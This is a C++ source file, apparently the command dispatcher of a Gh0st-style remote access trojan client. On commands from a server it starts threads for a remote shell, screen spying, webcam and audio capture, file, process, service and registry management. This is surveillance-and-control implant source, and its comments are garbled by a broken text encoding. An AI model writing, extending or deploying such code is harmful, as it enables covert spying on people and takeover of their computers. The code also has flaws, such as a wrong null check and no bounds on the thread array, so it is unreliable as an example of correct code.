#include "stdafx.h"
#include "KernelManager.h"
#include "IOCPClient.h"

CKernelManager::CKernelManager(IOCPClient* ClientObject)
	: CManager(ClientObject)
{
	memset(m_ThreadHandle, NULL, sizeof(HANDLE) * 0x1000);
	m_ulThreadCount = 0;
}


CKernelManager::~CKernelManager()
{
	int i = 0;
	for ( i = 0; i < 0x1000;i++)
	{
		if (m_ThreadHandle != NULL)
		{
			CloseHandle(m_ThreadHandle[i]);
			m_ThreadHandle[i] = NULL;

		}
	}
	m_ulThreadCount = 0;
}

VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ilLength)
{
	switch (szBuffer[0])
	{
		//Զ�̽��̹���
		case COMMAND_SYSTEM:
		{
			m_ThreadHandle[m_ulThreadCount++] =
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LoopProcessManager,
					NULL, 0, NULL);
			break;

		}
		//��ʱ��Ϣ
		case COMMAND_TALK:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopTalkManager,
				NULL, 0, NULL);
			break;
		}
		//����
		case COMMAND_BYE:
		{
			BYTE	bToken = COMMAND_BYE;      //����ͷ�ļ� Common.h     
			m_ClientObject->OnServerSending((char*)&bToken, 1);
			break;
		}
		//Զ���ն�
		case COMMAND_SHELL:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopShellManager,
				NULL, 0, NULL);
			break;
		}
		//Զ�̴��ڹ���
		case COMMAND_WSLIST:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopWindowManager,
				NULL, 0, NULL);
			break;
		}
		//�������
		case COMMAND_SCREEN_SPY:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopScreenManager,
				NULL, 0, NULL);
			break;
		}
		//Զ���ļ�
		case COMMAND_LIST_DRIVE:
		{

			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopFileManager,
				NULL, 0, NULL);

			break;
		}
		//Զ����Ƶ
		case COMMAND_AUDIO:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopAudioManager,
				NULL, 0, NULL);
			break;
		}
		//Զ����Ƶ  û��
		case COMMAND_WEBCAM:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopVideoManager,
			     NULL, 0, NULL);
			break;
		}
		case COMMAND_SERVICES:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopServicesManager,
				NULL, 0, NULL);
			break;
		}
		case COMMAND_REGEDIT:
		{
			m_ThreadHandle[m_ulThreadCount++] = CreateThread(NULL, 0,
				(LPTHREAD_START_ROUTINE)LoopRegisterManager,
				NULL, 0, NULL);
			break;
		}
		default:
			break;
	}
}
